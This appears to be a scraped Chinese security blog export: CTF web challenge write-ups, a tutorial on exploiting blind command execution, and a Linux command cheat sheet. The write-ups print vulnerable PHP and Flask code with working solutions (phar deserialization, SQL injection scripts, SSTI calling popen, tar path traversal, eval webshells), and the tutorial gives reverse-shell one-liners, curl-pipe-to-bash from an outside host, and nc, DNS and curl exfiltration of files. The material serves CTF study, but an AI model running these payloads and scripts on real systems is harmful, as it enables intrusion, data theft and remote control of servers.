&#125;&#125;class dbCtrl&#123; public $hostname=\"127.0.0.1\"; public $dbuser=\"p3rh4ps\"; public $dbpass=\"p3rh4ps\"; public $database=\"p3rh4ps\"; public $name; public $password; public $mysqli; public $token; public function __construct() &#123; $this-&gt;name=$_POST['username']; $this-&gt;password=$_POST['password']; &#125; public function login() &#123; $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database); if ($this-&gt;mysqli-&gt;connect_error) &#123; die(\"连接失败，错误:\" . $this-&gt;mysqli-&gt;connect_error); &#125; $sql=\"select id,password from users where username=?\"; $result=$this-&gt;mysqli-&gt;prepare($sql); $result-&gt;bind_param('s', $this-&gt;name); $result-&gt;execute(); $result-&gt;bind_result($idResult, $passwordResult); $result-&gt;fetch(); $result-&gt;close(); if ($this-&gt;token=='admin') &#123; return $idResult; &#125; if (!$idResult) &#123; echo('用户不存在!'); return false; &#125; if (md5($this-&gt;password)!==$passwordResult) &#123; echo('密码错误！'); return false; &#125; $_SESSION['token']=$this-&gt;name; return $idResult; &#125; public function __destruct()&#123; echo $this-&gt;token; &#125;&#125;Class Upload&#123; public $flag; public $file; public $ext; function __construct()&#123; $this-&gt;flag = 1; $this-&gt;black_list = ['ph', 'ht', 'sh', 'pe', 'j', '=', 'co', '\\\\', '\"', '\\'']; &#125; function check()&#123; $ext = substr($_FILES['file']['name'], strpos($_FILES['file']['name'], '.')); $reg=implode(\"|\",$this-&gt;black_list); $reg = \"/\" . $reg . \"\\x|\\s|[\\x01-\\x20]/i\"; if(preg_match($reg, $ext))&#123; $this-&gt;flag = 0; &#125; $this-&gt;ext = $ext; &#125; function __wakeup()&#123; $this-&gt;flag = 1; &#125; function upload()&#123; $this-&gt;file = $_FILES['file']; $this-&gt;check(); if($this-&gt;flag)&#123; if(isset($_FILES['file']))&#123; if ($_FILES[\"file\"][\"error\"] &gt; 0)&#123; echo \"Error: \" . $_FILES[\"file\"][\"error\"]; &#125; else&#123; if (file_exists(\"upload/\" . $_FILES[\"file\"][\"name\"]))&#123; echo $_FILES[\"file\"][\"name\"] . \" already exists. \"; &#125; else&#123; if ($_FILES[\"file\"][\"size\"] &gt; 10240)&#123; echo \"too big\"; &#125; else&#123; $new_addr = $_SERVER['DOCUMENT_ROOT'] . \"/upload/\" . md5($_FILES['file']['name']) . $this-&gt;ext; echo $new_addr; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $new_addr); return $new_addr; &#125; &#125; &#125; &#125; &#125; else&#123; die(\"Noooooooooooooooooooooooooooo!\"); &#125; &#125;&#125;Class Reader&#123; public $filename; public $result; public function read($filename)&#123; if (preg_match(\"/flag/i\",$filename))&#123; die(\"想多了嗷\"); &#125; if (preg_match(\"/sh/i\",$filename))&#123; die(\"nooooooooooo!\"); &#125; if (preg_match(\"/^php|^file|^gopher|^http|^https|^ftp|^data|^phar|^smtp|^dict|^zip/i\",$filename))&#123; die(\"Invid Schema!\"); &#125; echo file_get_contents($filename); &#125; public function __set($name,$val)&#123; echo file_get_contents($val);&#125;&#125; answer:通过上传phar文件，然后再嵌套读取 利用如下代码生成phar文件 1234567891011121314151617181920212223&lt;?phpclass User&#123; public $nickname; public $backup='/flag';&#125;class dbCtrl&#123; public $token;&#125;class Reader&#123;&#125;$dbCtrl = new dbCtrl();$user = new User();$dbCtrl-&gt;token = $user;$user-&gt;nickname = new Reader();$phar = new Phar(\"vul.phar\");$phar-&gt;startBuffering();$phar-&gt;addFromString(\"test.txt\", \"test\");$phar-&gt;setStub(\"&lt;?php __HALT_COMPILER();?&gt;\");$phar-&gt;setMetadata($dbCtrl);$phar-&gt;stopBuffering();?&gt; 上传，然后读取这里开头过滤了phar,可以嵌套协议 1compress.zlib://phar://[phar文件] 读取 西湖论剑easyjson123456789101112131415161718192021222324252627282930313233343536&lt;?phpinclude 'security.php';if(!isset($_GET['source']))&#123; show_source(__FILE__); die();&#125;$sandbox = 'sandbox/'.sha1($_SERVER['HTTP_X_FORWARDED_FOR']).'/';var_dump($sandbox);if(!file_exists($sandbox))&#123; mkdir($sandbox); file_put_contents($sandbox.\"index.php\",\"&lt;?php echo 'Welcome To Dbapp OSS.';?&gt;\");&#125;$action = $_GET['action'];$content = file_get_contents(\"php://input\");if($action == \"write\" &amp;&amp; SecurityCheck('filename',$_GET['filename']) &amp;&amp;SecurityCheck('content',$content))&#123; $content = json_decode($content); $filename = $_GET['filename']; $filecontent = $content-&gt;content; $filename = $sandbox.$filename; file_put_contents($filename,$filecontent.\"\\n Powered By Dbapp OSS.\");&#125;elseif($action == \"reset\")&#123; $files = scandir($sandbox); foreach($files as $file) &#123; if(!is_dir($file))&#123; if($file !== \"index.php\")&#123; unlink($sandbox.$file); &#125; &#125; &#125;&#125;else&#123; die('Security Check Failed.');&#125; security.php 123456789101112131415161718192021222324&lt;?php/** * Created by PhpStorm. * User: meizj * Date: 2020/2/7 * Time: 1:31 PM */function SecurityCheck($type,$content)&#123; switch ($type)&#123; case 'filename': if(preg_match(\"/[^a-z\\.]/\", $content) !== 0) &#123; return false; &#125; return true; break; case 'content': if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file') || stristr($content,'php') || stristr($content,'.')) &#123; return false; &#125; return true; break; &#125;&#125; 解答http://www.plasf.cn/articles/2a808de4a49b19.html json支持的字符中可以支持unicode编码，那么我们全都用unicode编码来代替字符串不就行了 nesecWARMUPindex.php 123456789101112131415161718192021222324252627282930313233&lt;?phpinclude 'conn.php';include 'flag.php';if (isset ($_COOKIE['last_login_info'])) &#123; $last_login_info = unserialize (base64_decode ($_COOKIE['last_login_info'])); try &#123; if (is_array($last_login_info) &amp;&amp; $last_login_info['ip'] != $_SERVER['REMOTE_ADDR']) &#123; die('WAF info: your ip status has been changed, you are dangrous.'); &#125; &#125; catch(Exception $e) &#123; die('Error'); &#125;&#125; else &#123; $cookie = base64_encode (serialize (array ( 'ip' =&gt; $_SERVER['REMOTE_ADDR']))) ; setcookie ('last_login_info', $cookie, time () + (86400 * 30));&#125;if(isset($_POST['username']) &amp;&amp; isset($_POST['password']))&#123; $table = 'users'; $username = addslashes($_POST['username']); $password = addslashes($_POST['password']); $sql = new SQL(); $sql-&gt;connect(); $sql-&gt;table = $table; $sql-&gt;username = $username; $sql-&gt;password = $password; $sql-&gt;check_login();&#125;?&gt; conn.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?phpinclude 'flag.php'; class SQL &#123; public $table = ''; public $username = ''; public $password = ''; public $conn; public function __construct() &#123; &#125; public function connect() &#123; $this-&gt;conn = new mysqli(\"localhost\", \"xxxxx\", \"xxxx\", \"xxxx\"); &#125; public function check_login()&#123; $result = $this-&gt;query(); if ($result === false) &#123; die(\"database error, please check your input\"); &#125; $row = $result-&gt;fetch_assoc(); if($row === NULL)&#123; die(\"username or password incorrect!\"); &#125;else if($row['username'] === 'admin')&#123; $flag = file_get_contents('flag.php'); echo \"welcome, admin! this is your flag -&gt; \".$flag; &#125;else&#123; echo \"welcome! but you are not admin\"; &#125; $result-&gt;free(); &#125; public function query() &#123; $this-&gt;waf(); return $this-&gt;conn-&gt;query (\"select username,password from \".$this-&gt;table.\" where username='\".$this-&gt;username.\"' and password='\".$this-&gt;password.\"'\"); &#125; public function waf()&#123; $blacklist = [\"union\", \"join\", \"!\", \"\\\"\", \"#\", \"$\", \"%\", \"&amp;\", \".\", \"/\", \":\", \";\", \"^\", \"_\", \"`\", \"&#123;\", \"|\", \"&#125;\", \"&lt;\", \"&gt;\", \"?\", \"@\", \"[\", \"\\\\\", \"]\" , \"*\", \"+\", \"-\"]; foreach ($blacklist as $value) &#123; if(strripos($this-&gt;table, $value))&#123; die('bad hacker,go out!'); &#125; &#125; foreach ($blacklist as $value) &#123; if(strripos($this-&gt;username, $value))&#123; die('bad hacker,go out!'); &#125; &#125; foreach ($blacklist as $value) &#123; if(strripos($this-&gt;password, $value))&#123; die('bad hacker,go out!'); &#125; &#125; &#125; public function __wakeup()&#123; if (!isset ($this-&gt;conn)) &#123; $this-&gt;connect (); &#125; if($this-&gt;table)&#123; $this-&gt;waf(); &#125; $this-&gt;check_login(); $this-&gt;conn-&gt;close(); &#125;&#125;?&gt; ip.php 12&lt;?phpecho $_SERVER['REMOTE_ADDR']; answer.php 12345678910111213&lt;?phpclass SQL &#123; public $table = \"users\"; public $username = \"\\\\\"; public $password = \"or username='admin\"; public function __construct() &#123; &#125;&#125;$a = new SQL();$poc = base64_encode (serialize (array ( 'ip' =&gt; \"221.219.243.115\", 'hack'=&gt;$a)));echo $poc; SSRF ME12345678910import hashlibdef get_captcha(captcha): md5 = hashlib.md5() md5.update(captcha.encode()) s = md5.hexdigest()[-6:] return sfor i in range(0,1000000000): if get_captcha(str(i)) == \"3f631f\": print(i) exit(0) ezsqli1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?php//a \"part\" of the source code herefunction sqlWaf($s)&#123; $filter = '/xml|extractvalue|regexp|copy|read|file|select|between|from|where|create|grand|dir|insert|link|substr|mid|server|drop|=|&gt;|&lt;|;|\"|\\^|\\||\\ |\\'/i'; if (preg_match($filter,$s)) return False; return True;&#125;if (isset($_POST['username']) &amp;&amp; isset($_POST['password'])) &#123; if (!isset($_SESSION['VerifyCode'])) die(\"?\"); $username = strval($_POST['username']); $password = strval($_POST['password']); if ( !sqlWaf($password) ) alertMes('damn hacker' ,\"./index.php\"); $sql = \"SELECT * FROM users WHERE username='$&#123;username&#125;' AND password= '$&#123;password&#125;'\";// password format: /[A-Za-z0-9]/ $result = $conn-&gt;query($sql); if ($result-&gt;num_rows &gt; 0) &#123; $row = $result-&gt;fetch_assoc(); if ( $row['username'] === 'admin' &amp;&amp; $row['password'] ) &#123; if ($row['password'] == $password) &#123; $message = $FLAG; &#125; else &#123; $message = \"username or password wrong, are you admin?\"; &#125; &#125; else &#123; $message = \"wrong user\"; &#125; &#125; else &#123; $message = \"user not exist or wrong password\"; &#125;&#125;?&gt; answer 1username=1111'+union+select+1,'admin','admin'%23&amp;password=admin&amp;captcha=NZZ easql_sql12345678910111213141516171819202122232425def and_operation(): url=\"http://124.71.148.26:30022/\" flag_payload= \"admin') and if((ascii(substr((select * from security.flag limit 0,1),&#123;0&#125;,1))&amp;&#123;1&#125;),sleep(2),1) -- \" info=\"\" for j in range(1,42): value=0 for k in range(7): payload=flag_payload.format(j,2**k) data=&#123; \"uname\": payload, \"passwd\":\"ye1s\" &#125; start_time = time.time() requests.post(url=url, data=data) end_time = time.time() spend_time = end_time - start_time if spend_time&gt;=2: value=value+(2**k) if value==0: break info=info+chr(value) print(info)if __name__==\"__main__\": and_operation() 太湖杯checkInGame以为打完游戏，应该是不可能的，所以可以看一下调用的类和方法，看那个是玩游戏成功，会调用的方法，直接调用，即可得到flag CrossFire解法： https://blog.csdn.net/wanmiqi/article/details/110202417 十六进制转ASCII码 https://www.bejson.com/convert/ox2str/通过盲注得到源码 1234567891011121314151617181920212223242526def and_operation(): url=\"http://122.112.249.228:10084/index.php?id=193\" flag_payload= \" and ascii(substr((select hex(load_file(0x2f6574632f706173737764))),&#123;0&#125;,1))%26&#123;1&#125; -- \" info=\"\" for j in range(1,1100): value=0 for k in range(7): payload=flag_payload.format(j,2**k) #data=&#123; # \"uname\": payload, # \"passwd\":\"ye1s\" #&#125; res=requests.get(url=url+payload) if \"&lt;img src='\" in res.text: value=value+(2**k) if value==0: break info=info+chr(value) print(info)if __name__==\"__main__\": and_operation() index.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?php error_reporting(0); session_start(); include('config.php'); $upload = 'upload/'.md5(\"shuyu\".$_SERVER['REMOTE_ADDR']); @mkdir($upload); file_put_contents($upload.'/index.html', ''); if(isset($_POST['submit']))&#123; $allow_type=array(\"jpg\",\"gif\",\"png\",\"bmp\",\"tar\",\"zip\"); $fileext = substr(strrchr($_FILES['file']['name'], '.'), 1); if ($_FILES[\"file\"][\"error\"] &gt; 0 &amp;&amp; !in_array($fileext,$type) &amp;&amp; $_FILES[\"file\"][\"size\"] &gt; 204800)&#123; die('upload error'); &#125;else&#123; $filename=addslashes($_FILES['file']['name']); $sql=\"insert into img (filename) values ('$filename')\"; $conn-&gt;query($sql); $sql=\"select id from img where filename='$filename'\"; $result=$conn-&gt;query($sql); if ($result-&gt;num_rows &gt; 0) &#123; while($row = $result-&gt;fetch_assoc()) &#123; $id=$row[\"id\"]; &#125; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],$upload.'/'.$filename); header(\"Location: index.php?id=$id\"); &#125; &#125; &#125; elseif (isset($_GET['id']))&#123; $id=addslashes($_GET['id']); $sql=\"select filename from img where id=$id\"; $result=$conn-&gt;query($sql); if ($result-&gt;num_rows &gt; 0) &#123; while($row = $result-&gt;fetch_assoc()) &#123; $filename=$row[\"filename\"]; &#125; $img=$upload.'/'.$filename; echo \"&lt; img src='$img'/&gt;\"; &#125; &#125; elseif (isset($_POST['submit1']))&#123; $allow_type=array(\"jpg\",\"gif\",\"png\",\"bmp\",\"tar\",\"zip\"); $fileext = substr(strrchr($_FILES['file']['name'], '.'), 1); if ($_FILES[\"file\"][\"error\"] &gt; 0 &amp;&amp; !in_array($fileext,$type) &amp;&amp; $_FILES[\"file\"][\"size\"] &gt; 204800)&#123; die('upload error'); &#125;else&#123; $filename=addslashes($_FILES['file']['name']); move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],$upload.'/'.$filename); @exec(\"cd /tmp&amp;&amp;python3 /tar.py \".escapeshellarg('/var/www/html/'.$upload.'/'.$filename)); &#125; &#125;?&gt; config.php 12345678910111213141516&lt;?php $conn=mysqli_connect(\"localhost\",\"root\",\"root\",\"shuyu\"); if (mysqli_connect_error($conn))&#123; echo \" MySQL ʧ : \" . mysqli_connect_error(); &#125; foreach ($_GET as $key =&gt; $value) &#123; $value= str_ireplace('\\'','',$value); $value= str_ireplace('\"','',$value); $value= str_ireplace('union','',$value); $value= str_ireplace('select','',$value); $value= str_ireplace('from','',$value); $value= str_ireplace('or','',$value); $_GET[$key] =$value; &#125;?&gt; php相关代码 12@exec(&quot;cd &#x2F;tmp&amp;&amp;python3 &#x2F;tar.py&quot;.escapeshellarg(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;&#39;.$upload.&#39;&#x2F;&#39;.$filename)); 这里python的解压就存在很大的问题 tar解压目录穿越tar 命令可以在打包的时候把路径也打包进去 那么 对于解压 是不是也可以指定目录解压？（目录穿越） 我在自己的主机上执行: 1root@kali:~# tar cPvf midi.tar ../../../../../../../../var/www/html/testupload/payload.php 此时在本机生成了自己的midi.tar压缩文件 当在其他机器上解压此文件 会不会在/var/www/html/testupload/目录下生成payload.php呢？ 经过测试 Linux下解压(使用的是GNU的tar)，默认情况下，tar会自动把前面的/去掉，然后在当前目录解压 Unix则不然，会依照绝对路径解压，对路径中的其他文件不影响，对相同的文件，覆盖。如果不存在某个目录，则创建(如果有权限)。 在这里 python的解压 与Unix的解压同理，会直接在指定路径下进行解压 我们将制作好的midi.tar 上传进行解压，最终会在/var/www/html/testupload/下生成我们的payload.php easymd512345$result = @auth($username,$password);if (md5($username) == md5($result) and $result !== $username)&#123;echo \"bingo : &lt;b&gt;$flag&lt;/b&gt;\";&#125; payload 1name=240610708&amp;password=abcdabcdabcdabcdabcdabcdabcdabcdQNKCDZO&amp;submit=%E7%99%BB%E5%BD%95 https://ctftime.org/writeup/11325 某次比赛文件包含1?filename=php://filter/convert.iconv.utf-8.utf-16/resource=flag.php sql注入11'+(select+updatexml(1,substr((select secert from secert),1,40),1))+' 祥云杯command做题的时候尽量用 burpsuite 发送 1?url=a||grep%09-r%09fla%09/ flaskbot1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374import mathimport base64import sysapp = Flask(__name__)def safe(str): black_list = ['flag','os','system','popen','import','eval','chr','request', 'subprocess','commands','socket','hex','base64','*','?'] for x in black_list: if x in str.lower(): return \"Damn you hacker! You will never\" return str def guessNum(num,name): l=0 r=1000000000.0 mid=(l+r)/2.0 ret=\" cnt=0 while not abs(mid-num)&lt;0.00001: cnt=cnt+1 mid=(l+r)/2.0 if mid&gt;num: r=mid ret+=\"&#123;0&#125;:&#123;1&#125; is too large&lt;br/&gt;\".format(cnt,mid) else: l=mid ret+=\"&#123;0&#125;:&#123;1&#125; is too small&lt;br/&gt;\".format(cnt,mid) if cnt &gt; 50: break if cnt &lt; 50: ret+=\"&#123;0&#125;:&#123;1&#125; is close enough&lt;br/&gt;I win\".format(cnt,mid) else : ret+=\"Wow! &#123;0&#125; win.\".format(safe(name)) return ret @app.route('/',methods=['POST','GET'])def Hello(): if request.method == \"POST\": user = request.form['name'] resp = make_response(render_template(\"guess.html\",name=user)) resp.set_cookie('user',base64.urlsafe_b64encode(user),max_age=3600) return resp else: user=request.cookies.get('user') if user == None: return render_template(\"index.html\") else: user=user.encode('utf-8') return render_template(\"guess.html\",name=base64.urlsafe_b64decode(user))@app.route('/guess',methods=['POST'])def Guess(): user=request.cookies.get('user') if user==None: return redirect(url_for(\"Hello\")) user=user.encode('utf-8') name = base64.urlsafe_b64decode(user) num = float(request.form['num']) if(num&lt;0): return \"Too Small\" elif num&gt;1000000000.0: return \"Too Large\" else: return render_template_string(guessNum(num,name))@app.errorhandler(404)def miss(e): return \"What are you looking for?!!\".getattr(app, '__name__', getattr(app.__class__, '__name__')), 404if __name__ == '__main__': f_handler=open('/var/log/app.log', 'w') sys.stderr=f_handler app.run(debug=True, host='0.0.0.0',port=8888) 通过测试这里过滤了os，popen，system，flag等关键字符，可以通过拼接绕过，最后的payload user为 1&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s']['po'+'pen']('cat /super_secret_fl'+'ag.txt').read()&#125;&#125; base64编码，num为nan 嘶吼ctf签到题12345678910111213141516&lt;?php echo \"&lt;!-- /?url= --&gt;\"; if ($_GET['url']) &#123; if (preg_match(\"/flag/i\", $_GET['url'])) &#123; die(); &#125; $curl = curl_init(); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); curl_setopt($curl, CURLOPT_TIMEOUT, 500); curl_setopt($curl, CURLOPT_URL, $_GET['url']); $res = curl_exec($curl); curl_close($curl); echo $res;&#125; ssrf 两次url编码读取。因使用了curl函数，curl会在处理请求的时候再进行一次urldecode。故构造payload时二次urlencode即可绕过 ezsql过滤了挺多的，mysql8版本 1table information_schema.tables limit 330,1; 表达式来逐位爆破由此构造payload 1payload=\"'or('def','ctf','&#123;&#125;&#123;&#125;',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null)&lt;(table/**/information_schema.tables/**/limit/**/323,1)#\".format(flag,table[j]) 最后payload 12345678910111213141516171819202122import requestsimport stringdef tables(): url = \"http://139.129.98.9:30003/login.php\" flag = \"\" table = string.digits+string.ascii_uppercase+string.ascii_lowercase for i in range(1,8): for j in range(len(table)): payload = \"'or('def','ctf','&#123;&#125;&#123;&#125;',4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,'','','')&lt;(table/**/information_schema.tables/**/limit/**/323,1)#\".format(flag,table[j]) #print(payload) post = &#123; \"username\":payload, \"password\":\"123\" &#125; text = requests.post(url=url,data=post).content.decode(\"utf-8\") if \"username error!\" in text: flag += table[j-1] print(flag) break new_flag =flag[:-1] + table[table.find(flag[-1])+1] print(new_flag)tables() 纵横杯马赛克https://github.com/beurtschipper/Depix hello_php从配置文件得知 后台登录账户密码 admin admin888上传aaa.phar文件，修改title,并写入一句话 1234567891011121314151617181920&lt;?phpclass Config&#123; public $title; public $comment; public $logo_url; public function __construct()&#123; $this-&gt;title= '123\\';echo 123;@eval($_POST[1]);?&gt;'; &#125; &#125;$phar = new Phar(\"aaa.phar\"); //后缀名必须为 phar$phar-&gt;startBuffering();$phar -&gt; setStub('GIF89a'.'&lt;?php __HALT_COMPILER();?&gt;');$object = new Config;$phar-&gt;setMetadata($object); //将自定义的 meta-data 存入 manifest$phar-&gt;addFromString(\"a.txt\", \"a\"); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering(); index.php中 ?img=phar://文件名路径 触发 disable_function 很多函数，file_get_contents()没有被禁止，注意记得要打印出来1=var_dump(file_get_contents (‘/flag’)); 大家一起来审代码海洋cms10.1v该版本相关漏洞： https://www.freebuf.com/vuls/241106.html出题人对漏洞点进行了防护，可以找其他漏洞点，或绕过防护 如 admin_ping.php 文件没有对传入的参数做任何防护，可直接传入如下值利用一： 1\";system(\"cat /flag\");eval($_GET['1']);/* 利用二：取反 12345&lt;?phpecho urlencode(~\"system\");echo \"\\n\";echo urlencode(~\"cat /flag\");?&gt; payload 1231\");$z='%8C%86%8C%8B%9A%92';$p=~'%9C%9E%8B%DF%D0%99%93%9E%98';$z=~$z;$z($p);// ezcms https://github.com/yzmcms/yzmcms/issues/53","categories":[],"tags":[]},{"title":"无回显命令执行","slug":"无回显命令执行","date":"2020-09-10T08:51:00.000Z","updated":"2020-09-10T14:22:06.542Z","comments":true,"path":"article/e8fed0e.html","link":"","permalink":"https://blog.cfyqy.com/article/e8fed0e.html","excerpt":"命令执行可能会存在命令执行但没有回显，所以首先要判断命令是否有执行。确定命令可以执行，然后就可以进行无回显命令执行的利用了。","text":"命令执行可能会存在命令执行但没有回显，所以首先要判断命令是否有执行。确定命令可以执行，然后就可以进行无回显命令执行的利用了。 判断方法测试代码 123456&lt;?phphighlight_file(__FILE__);if(isset($_GET['cmd']))&#123; shell_exec($_GET['cmd']);&#125;?&gt; 延迟1?cmd=ls | sleep 3 通过是否延时来判断该条命令是否有执行，有延时则代表命令有执行,延迟3秒 HTTP请求1.在公网服务器监听监听端口 1nc -lvp 4444 2.向目标服务器发起http请求，执行curl命令 1?cmd=|curl ip:4444 如果向目标服务器发起http请求后，公网服务器监听端口得到一些信息，就证明测试点存在命令执行漏洞 DNS 请求 如果请求的目标不是ip地址而是域名，那么域名最终还要转化成ip地址，就肯定要做一次域名解析请求。那么假设我有个可控的二级域名，那么它发出三级域名解析的时候，我这边是能够拿到它的域名解析请求的，这就相当于可以配合DNS请求进行命令执行的判断，这一般就被称为dnslog。（要通过dns请求即可通过ping命令，也能通过curl命令，只要对域名进行访问，让域名服务器进行域名解析就可实现。 去ceye.io注册，注册完后会给一个域名如果有该域名解析请求就会被记录 12?cmd=ls |curl `whoami`.awa4xw.ceye.io?cmd=ls |ping `whoami`.awa4xw.ceye.io 利用方法示例代码：index.php 12345678910&lt;?phpheader(\"Content-type: text/html; charset=utf-8\");highlight_file(__FILE__);include(\"flag.php\");$ip=$_REQUEST['ip'];if($ip)&#123; shell_exec(\"ping -c 4 \".$ip);&#125;?&gt; 命令执行使用&gt;或&gt;&gt;1?ip=1 |cat flag.php &gt;flag.txt mv 或 cp12?ip=1 |mv flag.php flag.txt?ip=1 |cp flag.php flag.txt 打包压缩（1）tar打包或tar打包并压缩 12tar cvf flag.tar flag.phptar zcvf flag.tar.gz flag.php （2）zip压缩 1zip flag.zip flag.php cut and sleepsed指定读取文件的第几行 1cat flag.php | sed -n '2p' 提取每一行的第3个字节 1cut -b 3 flag文件 最后 1cat flag.php | sed -n '2p' |cut -b 1 脚本 123456789101112131415import requestsimport timeurl=\"http://119.3.37.185/\"flag=\"\"for i in range(6,65): for j in range(32,127): data=\"a=`cut -b &#123;&#125; /flag*`;[ $a = \\\"&#123;&#125;\\\" ] &amp;&amp; sleep 1\".format(i,chr(j)) #print(data) start_time=time.time() requests.post(url=url,data=&#123;\"cmd\":data&#125;) end_time = time.time() spend_time = end_time - start_time if spend_time&gt;1: flag += chr(j) print(flag) 写入webshell直接写入 1?ip=1| echo \"&lt;?php @eval(\\$_POST[9415]); ?&gt;\" &gt; webshell.php 外部下载 1wget 网址 -O webshell.php #使用wget下载shell，使用参数-O来指定一个文件名 dnslog （1）命令执行时要避免空格，空格会导致空格后面的命令执行不到；（2）将读取的文件命令用反引号``包含起来；（3）拼接的域名有长度限制 123456#用&lt;替换读取文件中的空格，且对输出结果base64编码curl &#96;cat&lt;flag.php|base64&#96;#拼接域名(最终构造结果)curl &#96;cat&lt;flag.php|base64&#96;.awa4xw.ceye.io#另一种方法(不过有的环境下不可以)&#96;cat flag.php|sed s&#x2F;[[:space:]]&#x2F;&#x2F;g&#96;.awa4xw.ceye.io 这里读取flag.php没有成功 反弹shell1.首先在公网服务器使用nc命令监听端口 1nc -lvp 4444 #或nc -vv -lp 4444 2.然后在公网服务器上写一个文件(我写入到qwzf文件)，内容是下面命令 1bash -i &gt;&amp; /dev/tcp/x.x.x.x/4444 0&gt;&amp;1 3.最终浏览器上执行的payload(实际上就是在目标机执行curl x.x.x.x:8002/qwzf|bash) 1ip=|curl x.x.x.x:8002/qwzf|bash nctcp1.公网服务器监听4444端口 1nc -tlp 4444 2.目标服务器执行如下命令 1ip=|nc -t x.x.x.x 4444 &lt; flag.php -u参数调整为udp,当tcp不能使用的时候使用 udp 1.公网服务器监听4444端口 1nc -ulp 4444 2.目标服务器执行如下命令 1ip=|nc -u x.x.x.x 4444 &lt; flag.php curl上传文件读取源码利用条件：目标服务器curl命令可以正常执行 使用curl -F将flag文件上传到Burp的Collaborator Client(Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看POST请求包以及打Cookies) 1.获取Collaborator Client分配给Burp的链接 12打开Burp主界面 -&gt; 菜单（Burp）-&gt; Collaboraor Client -&gt; 点击Copy to Clipboard 2.拼接payload并在命令执行处提交 1ip=1|curl -X POST -F xx=@flag.php http://6hoo9jdwyggr4rkwrgoy1f51bshi57.burpcollaborator.net 3.查看Collaborator Client收到的数据 参考文章：浅谈PHP无回显命令执行的利用CTF入门web篇18命令执行无回显的判断方法及dnslog相关例题","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"无回显命令执行","slug":"无回显命令执行","permalink":"https://blog.cfyqy.com/tags/%E6%97%A0%E5%9B%9E%E6%98%BE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"}],"author":"ye1s"},{"title":"linux 常用命令记录","slug":"linux-常用命令记录","date":"2020-09-09T01:54:00.000Z","updated":"2021-01-31T14:53:43.122Z","comments":true,"path":"article/8a65f310.html","link":"","permalink":"https://blog.cfyqy.com/article/8a65f310.html","excerpt":"记录自己常用的 Linux 命令","text":"记录自己常用的 Linux 命令 进程创建后台进程 1nohup sudo ./Cardinal &gt; output.log 2&gt;&amp;1 &amp; 删除某个程序的所有进程 12ps -ef | grep Cardinal | grep -v grep | awk '&#123;print $2&#125;'|sudo xargs kill -9ps -ef | grep spiderks.py | grep -v grep | cut -c 9-15 | xargs kill -9 用户创建用户 12useradd -g test -d /home/test1 -s /etc/bash -m test1#注解：-g 所属组 -d 家目录 -s 所用的SHELL 删除用户命令 1userdel -r test1 创建密码命令 1passwd 设置普通用户允许sudo 123sudo chmod u+w /etc/sudoerssudo vi /etc/sudoers #在root ALL=(ALL:ALL) ALL下添加 用户 ALL=(ALL:ALL) ALL sudo chmod u-w /etc/sudoers 存储定时新建定时文件 1vi /etc/cron.d/FreshRSS FreshRSS内容 1*/30 * * * * root php /var/www/rss/FreshRSS/app/actualize_script.php &gt; /tmp/FreshRSS.log 2&gt;&amp;1 &amp; 查看crontab 是否启动成功，检测crontab 服务是否启动 1/etc/init.d/cron status 没启动则要用下面命令启动 1/etc/init.d/cron start 服务docker查看docker占用的存储 1docker system df docker批量停止某类型的容器 1sudo docker ps |grep web_14|awk '&#123;print $1&#125;'| sudo xargs docker stop docker 批量启动某类型容器 1sudo docker ps -a|grep web_14|awk '&#123;print $1&#125;'| sudo xargs docker start 从宿主机拷文件到容器里面 12 从容器里面拷文件到宿主机 1docker cp 容器名：要拷贝的文件在容器里面的路径 要拷贝到宿主机的相应路径 iptablesiptables是隔离主机以及网络的工具，通过自己设定的规则以及处理动作对数据报文进行检测以及处理。 1iptables -t 表名 &lt;-A/I/D/R&gt; 规则链名 [规则号] &lt;-i/o 网卡名&gt; -p 协议名 &lt;-s 源IP/源子网&gt; --sport 源端口 &lt;-d 目标IP/目标子网&gt; --dport 目标端口 -j 动作 表filter表：确定是否放行该数据包（过滤）nat表：修改数据包中的源、目标IP地址或端口managle表：为数据包设置标记raw表：确定是否对该数据包进行状态跟踪 规则链名：INPUT 本机进站的数据流 (路由前)OUTPUT 本机出站的数据流 (数据包流入口)FORWARD 路由的数据流 (转发管卡)POSTROUTING 路由后的数据流(数据包出口)PREROUTING 路由前的数据流 (路由后) 表跟链的对应关系： 123filter: INPUT——OUTPUT——FORWARD nat: OUTPUT——PREROUTING——POSTROUTING mangle: INPUT——OUTPUT——FORWARD——PREROUTING——POSTROUTING 动作包括： 1234567accept：接收数据包。DROP：丢弃数据包。REDIRECT：重定向、映射、透明代理。SNAT：源地址转换。DNAT：目标地址转换。MASQUERADE：IP伪装（NAT），用于ADSL。LOG：日志记录 堵通策略是指对数据包所做的操作，一般有两种操作——“通（ACCEPT）”、“堵（DROP）”，还有一种操作很常见REJECT. 谈谈REJECT和DROP之间的区别，Ming写了一封信，向Rose示爱。Rose如果不愿意接受，她可以不回应Ming,这个时候Ming不确定Rose是否接到了信；Rose也可以同样写一封信，在信中明确地拒绝Ming。前一种操作就如同执行了DROP操作，而后一种操作就如同REJECT操作。 查看iptables列表 1iptables -nL iptables命令的管理控制选项 123456789101112131415-A 在指定链的末尾添加（append）一条新的规则-D 删除（delete）指定链中的某一条规则，可以按规则序号和内容删除-I 在指定链中插入（insert）一条新的规则，默认在第一行添加-R 